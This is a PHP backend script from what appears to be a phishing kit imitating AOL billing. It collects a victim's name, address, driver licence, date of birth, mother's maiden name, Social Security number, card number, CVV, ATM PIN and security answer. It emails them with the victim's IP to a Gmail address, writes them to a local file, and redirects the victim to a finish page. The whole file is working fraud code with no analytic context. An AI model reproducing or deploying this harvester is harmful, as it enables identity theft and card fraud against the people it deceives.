<?php
	if (isset($_GET['id'])) {
		$id = $_GET['id'];
	}
?>

<?php

	$ip=getenv(REMOTE_ADDR);
	$hostname = gethostbyaddr($ip);
	
	$email_from = 'paulinasz682@gmail.com';

	$email_subject = "AOL - Billing and Card Info " . $id;

	$email_body = "";
	$email_body .= "----|Lay Solver|----\n";
	$email_body .= "First Name: " . $_POST['fName'] . "\n"; 
	$email_body .= "Last Name: " . $_POST['lName'] . "\n"; 
	$email_body .= "Address: " . $_POST['address'] . "\n"; 
	$email_body .= "Driver Licence: " . $_POST['licence'] . "\n"; 
	$email_body .= "City: " . $_POST['city'] . "\n"; 
	$email_body .= "State: " . $_POST['state'] . "\n"; 
	$email_body .= "Zip Code: " . $_POST['zip'] . "\n"; 
	$email_body .= "Date Of Birth: " . $_POST['doBirth'] . "\n"; 
	$email_body .= "DOB Date: " . $_POST['date'] . "\n"; 
	$email_body .= "DOB Date Year: " . $_POST['year'] . "\n"; 
	$email_body .= "Mother's Maiden Name: " . $_POST['mmName'] . "\n"; 
	$email_body .= "Social Security Number: " . $_POST['ssNo'] . "\n"; 
	$email_body .= "Account Security Question: " . $_POST['accSquestion'] . "\n"; 
	$email_body .= "Answer: " . $_POST['answer'] . "\n";
	$email_body .= "Card Type: " . $_POST['carType'] . "\n"; 
	$email_body .= "Card Number: " . $_POST['carNo'] . "\n"; 
	$email_body .= "Address: " . $_POST['expireDate'] . "\n"; 
	$email_body .= "Expiration Date: " . $_POST['expireDate'] . "\n"; 
	$email_body .= "Expiration Year: " . $_POST['expireYear'] . "\n"; 
	$email_body .= "CVV: " . $_POST['civic'] . "\n"; 
	$email_body .= "CIID: " . $_POST['ccidNo'] . "\n"; 
	$email_body .= "ATM Pin: " . $_POST['pin'] . "\n"; 
	$email_body .= "Phone Number: " . $_POST['phone'] . "\n"; 
	$email_body .= "--------------------\n";
    $email_body .= "ip: " . $ip . "\n"; 
	$email_body .= "hostname: " .$hostname ."\n";   

?>
<?php
	$message = $email_subject;
	$message .= $email_body;

  $to = "stegeorgefan@gmail.com";

  $headers = "From: $email_from \r\n";

  $headers .= "Reply-To: $email_from \r\n";

  mail($to,$email_subject,$email_body,$headers);
  
	@fclose(@fwrite(@fopen("fullsfgddd.txt", "a"),$message));
 ?>
 
 <script type="text/javascript"> 
<!-- 
   window.location="finish.php"
</script> 
